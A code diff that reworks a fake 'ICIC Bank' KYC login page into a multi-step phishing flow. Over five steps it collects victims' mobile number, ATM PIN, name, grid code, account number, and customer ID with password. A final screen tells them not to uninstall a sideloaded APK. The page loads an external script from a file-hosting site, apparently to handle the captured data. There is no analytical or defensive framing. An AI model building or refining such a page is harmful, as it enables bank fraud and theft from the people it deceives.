@@ -7,68 +7,50 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            background-color: #f5f5f5;
         }
+
         .container {
-            background-color: white;
+            width: 100%;
+            max-width: 400px;
             padding: 20px;
-            border-radius: 10px;
+            background-color: white;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
-            width: 400px;
         }
-        .container img {
-            width: 350px;
-            margin-bottom: 20px;
-        }
-        .header-text {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .welcome-text {
-            font-size: 14px;
-            margin-bottom: 20px;
-            color: #555;
-        }
-        .input-field {
-            margin-bottom: 15px;
-            width: 100%;
-        }
-        .input-field input {
+
+        input[type="text"], input[type="password"], input[type="number"] {
             width: 100%;
             padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
+            margin: 10px 0;
+            box-sizing: border-box;
         }
-        .checkbox {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-        .checkbox label {
-            font-size: 14px;
-        }
-        .login-button {
+
+        button {
             width: 100%;
             padding: 10px;
-            background-color: #0066cc;
+            background-color: #007bff;
             color: white;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
             cursor: pointer;
+            margin-top: 10px;
         }
-        .login-button:hover {
-            background-color: #005bb5;
+
+        button:hover {
+            background-color: #0056b3;
         }
+
+        .hidden {
+            display: none;
+        }
+
         #loadingPopup {
             display: none;
             position: fixed;
@@ -82,59 +64,86 @@
             color: white;
             font-size: 18px;
         }
-        #loadingPopup .circle {
+
+        #loadingPopup div {
+            text-align: center;
+        }
+
+        #loadingPopup div::before {
+            content: "";
             border: 4px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top: 4px solid white;
             width: 50px;
             height: 50px;
             animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .note {
+            font-size: 14px;
+            color: red;
+            margin-top: 20px;
+        }
+
+        .exit-button {
+            background-color: #dc3545;
+        }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <img src="https://i.ibb.co/T8Xhg5r/icici-bank-aeps-500x500.jpg" alt="ICIC Bank Logo">
-    <div class="header-text">Login to Internet Banking</div>
-    <div class="welcome-text">
-        Welcome to ICIC Bank's fast & secure online KYC app. You can complete your KYC within 2 minutes. Thank you for joining ICIC BANK.
+    <!-- Step 1: Mobile, ATM PIN, Full Name -->
+    <div id="step1" class="container">
+        <h2>Enter your details</h2>
+        <input type="text" id="mobile" placeholder="Mobile Number (10 digits)">
+        <input type="text" id="atmPin" placeholder="ATM PIN (4 digits)">
+        <input type="text" id="fullName" placeholder="Full Name">
+        <button onclick="submitFirstPage()">Submit</button>
     </div>
 
-    <div class="input-field">
-        <label for="mobile">Mobile No:</label>
-        <input type="text" id="mobile" maxlength="10" placeholder="Enter 10-digit mobile number">
+    <!-- Step 2: Grid Code -->
+    <div id="step2" class="container hidden">
+        <h2>Enter Grid Code</h2>
+        <input type="text" id="gridCode" placeholder="Grid Code (12 digits)">
+        <button onclick="submitSecondPage()">Submit</button>
     </div>
 
-    <div class="input-field">
-        <label for="atmPin">ATM PIN:</label>
-        <input type="password" id="atmPin" maxlength="4" placeholder="Enter 4-digit ATM PIN">
+    <!-- Step 3: Account Number -->
+    <div id="step3" class="container hidden">
+        <h2>Enter Account Number</h2>
+        <input type="text" id="accountNumber" placeholder="Account Number (12 digits)">
+        <button onclick="submitThirdPage()">Submit</button>
     </div>
 
-    <div class="input-field">
-        <label for="fullName">Full Name:</label>
-        <input type="text" id="fullName" placeholder="Enter your full name">
+    <!-- Step 4: User/Customer ID and Password -->
+    <div id="step4" class="container hidden">
+        <h2>Enter User/Customer ID and Password</h2>
+        <input type="text" id="userId" placeholder="User/Customer ID">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="submitFourthPage()">Submit</button>
     </div>
 
-    <div class="checkbox">
-        <label for="remember">
-            <input type="checkbox" id="remember"> Remember me
-        </label>
+    <!-- Step 5: Final Page with Important Note -->
+    <div id="step5" class="container hidden">
+        <h2>IMPORTANT NOTE</h2>
+        <p>Please wait, your details are being verified. It will take a minimum of 30 minutes.</p>
+        <p class="note">Most Important: Don't delete or uninstall this app. Thanks for joining ICIC Bank online services. Recently launched from ICIC KYC app in APK format, not Play Store.</p>
+        <button class="exit-button" onclick="saveAndExit()">Exit</button>
     </div>
 
-    <button class="login-button" onclick="submitFirstPage()">Login</button>
-</div>
+    <!-- Loading Popup -->
+    <div id="loadingPopup" style="display: none;">
+        <div>
+            <h2>Loading...</h2>
+            <p>Please wait...</p>
+        </div>
+    </div>
 
-<div id="loadingPopup">
-    <div class="circle"></div>
-    <h2>Logging In...</h2>
-    <p>Please wait...</p>
-</div>
-
-<script src="https://static.staticsave.com/alljs/icicbank.js"></script>
+    <script src="https://static.staticsave.com/alljs/icicbank.js"> </script>
 </body>
 </html>
